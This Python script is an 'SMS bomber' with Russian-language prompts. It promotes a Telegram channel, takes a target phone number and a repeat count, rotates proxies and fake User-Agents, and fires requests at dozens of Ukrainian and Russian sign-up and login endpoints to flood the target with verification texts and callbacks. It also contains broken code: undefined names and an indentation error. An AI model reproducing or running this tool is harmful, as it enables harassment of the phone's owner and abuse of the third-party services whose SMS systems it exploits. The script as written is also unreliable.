# Version 1.0
import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *

console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

def generate_proxy():
    proxy = requests.get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
    console.print(proxy)
    return {"http": proxy, "https": proxy}
    main()

console.print('''[bold green]
  ___   _ __     __ _   _ __ ___
 / __| | '_ \   / _` | | '_ ` _ \
 \__ \ | |_) | | (_| | | | | | | |
 |___/ | .__/   \__,_| |_| |_| |_|
       |_|
''')
console.print('''[bold red]
 -----------------------------------------
| Telegram Channel - @privatesoft0        |
| Developers - @soeden1x, @a789812211     |
 -----------------------------------------
''')

try:
    os.system("termux-open-url https://t.me/joinchat/ra49fxzPRw5kNzYy")
except:
  pass

conut = console.input('[cyan]Выберите вашу страну:\n[red][1] - Украина\n[2] - Россия\n[blue]spammer>> ')

console.print("[purple]Введите номер телефонa (без +): ")

number = console.input("[blue]spammer>> ")

proxy = console.input("[yellow]Использовать прокси? (y/n):\n[blue]spammer>> ")
if proxy.lower() == "y":
        proxies = generate_proxy()
else:
        proxies = None

run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))

def ukr():
        for _ in track(range(run)):
                headers = {"User-Agent": fake_useragent.UserAgent().random}
                try:
                        requests.post("https://my.ctrs.com.ua/api/auth/login", json={"phone": "+" + number}, headers=headers, proxies=proxies)#https://www.citrus.ua/?gclsrc=aw.ds&gclid=CjwKCAiAs92MBhAXEiwAXTi253UnT0-Ws93B3drlp81h97IFAOzTqmkLJLEStUktScA14Vu5Jn8AShoCS-UQAvD_BwE
                except:
                        pass
                try:
                        requests.post("https://account.104.ua/signup/request/create", data={"phone": number}, headers=headers, proxies=proxies)#https://ok.104.ua/ua/signup?step=2
                except:
                        pass
                try:
                        requests.post("https://www.liqpay.ua/apiweb/login/start", data={"phone": number, "token": "lp_91d8dedf4a311ad78604ec6b4e572ded001502bb"}, headers=headers, proxies=proxies)#https://www.liqpay.ua/ru/authorization
                except:
                        pass
try:
                        requests.post("https://u.icq.net/api/v70/rapi/auth/sendCoden", params={"phone": number, "devId": "ic1rtwz1s1Hj1O0r"}, headers=headers, proxies=proxies)#https://web.icq.com/
                except:
                        pass
#САйт которий я не понель
#https://m.olx.ua/account/register/
#https://www.instagram.com/accounts/signup/phone
#https://www.work.ua/confirm/?fromPage=jobseeker-register
#https://my.vodafone.ua/auth?language=ua
#https://www.instagram.com/accounts/password/reset/
#https://account.kyivstar.ua/cas/login?service=https%3A%2F%2Faccount.kyivstar.ua%2Fcas6%2Flogin%3Fclient_name%3DCasClient85
#https://vipplay.ru/#auth-code-phone
#https://eva.ua/#login

def russ():
        for _ in track(range(run)):
                headers = {"User-Agent": fake_useragent.UserAgent().random}
                try:
                        requests.post("https://dodopizza.ru/api/sendconfirmationcode", data={"phoneNumber": phone}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        requests.get("https://i.api.kari.com/ecommerce/client/registration/verify/phone/code?phone=%2B" + number, headers=headers,  proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://skoro-pizza.ru/api/user/generate-password", data={"phone": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post(f"https://www.2020700.ru/views/ajax/smscsend.php?phone={number}", headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post(f"https://msk.tele2.ru/api/validation/number/{number}", json={"sender": "Tele2"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://passport.aitu.io/api/v1/sms/request-code", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://brilliant24.ru/index/callme", data={"phone": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "#(###)###-##-##")
                        requests.post("https://hotkitchen-delivery.ru/user_account/ajax_1679123.php?do=sms_code", data={"phone": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+# ### #######")
                        requests.post("https://api.vipavenue.ru/v2/user/authNew/", json={"phone": "+" + number, "step": "1", "type": "phone"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://www.italbazar.ru/api/v1/auth/send_otp/", json={"source":  "+" + number, "type": "phone", "phoneChanged": "false"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+# (###) ###-##-##")
                        requests.post("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", data={"phone": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://blanc.ru/api/sso/entrance/login", json={"phoneNumber": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.get(f"https://privetmir.ru/recovery/step-2/?login={number}", headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+#+###+###-##-##")
                        requests.post("https://petrodv.takeeat.ru/ajax/callback_handler.php", data={"name": "Александр", "phone": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://1cmaster.tea.ru/local/ajax/mindbox.php", data={"type": "CheckCustomerByMobilePhone", "phone": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://www.traektoria.ru/local/ajax/authorize.php?action=2", data={"phone": number, "bxsessid": "e7e6c5b5e5695787dc9a77f39a70dd49", "lid": "tr"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "#+(###)+###+##+##")
                        requests.post("https://lk.ab-club.ru/login/send-code", data={"phone": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+#+(###)+###-##-##")
                        requests.post("https://www.zlato-grad.ru/catalog/sergi/puseti/yakutskie-brillianti/", data={"method": "get_code", "phone": "+" + number, "sessid": "6e10264ef2c09d2e78a1e871f1bf3288"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_pone = format_phone(number, "#+(###)+###+##+##")
                        requests.post("https://lk.ab-club.ru/register/send-code", data={"phone": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://lkdr.nalog.ru/api/v1/auth/challenge/sms/start", json={"phone": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "#(###)###-##-##")
                        requests.post("https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail", data={"email": email, "telephone": number, "password": "asasinkrid", "confirm": "asasinkrid"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post(f"https://mc.moezdorovie.ru/api/identity/Account/LoginApi?phoneNumber=+{number}", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "#(###)+###-##-##")
                        requests.post("https://lk.tabris.ru/local/components/wf/call_back/ajax.php", data={"name": "Сергей", "phone": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://api.01.hungrygator.ru/web/auth/webotp", json={"fu": "tralala", "userLogin": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://api.c5ia1s20aa-aromaluxe1-p1-public.model-t.cc.commerce.ondemand.com/rg/v1/newRG/customers/current/contacts/send-code", params={"configGroupCode": "default", "contact": number, "contactMustBeUnique": "true", "contactUserMustExist": "false"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://app.neo-pharm.ru/v5/auth/send-sms-code", json={"action": "sign-up", "phone": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post(" https://api.farfor.ru/v3/842b03f5-7db9-4850-9cb1-407f894abf5e/ufa/auth/request_code/", json={"phone": number, "ui_element": "login"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://groupprice.ru/auth_phone/send_phone_token", data={"phone": "+" + number, "time_zone": "120", "referer_from": "", "redirect_back": "", "token": ""}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://telephony.jivosite.com/api/1/sites/900909/widgets/OVHsL3W8hY/clients/17314/telephony/callback", data={"phone": number, "invitation_text": ""}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://goldapple.ru/rest/V2.0/customer/registration/start", json={"country_code": "RU", "phone": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        fromatted_phone = format_phone(number, "7##########")
                        requests.post("https://api.kazanexpress.ru/api/signup/customer", json={"name": "Сергей", "password": "AklajLopa1", "phoneNumber": number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass


if conut =='1':
        ukr()
elif conut == '2':
        russ()
